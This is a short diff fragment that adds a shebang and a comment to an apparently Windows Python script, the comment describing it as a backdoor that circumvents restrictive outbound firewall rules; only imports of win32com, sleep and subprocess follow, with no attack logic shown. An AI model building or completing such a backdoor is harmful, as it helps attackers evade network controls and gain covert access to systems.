@@ -1,3 +1,5 @@
+#!usr/bin/python3
+#this backdoor circumvents restrictive outbond firewall rules
 from win32com.client import Dispatch
 from time import sleep
 import subprocess
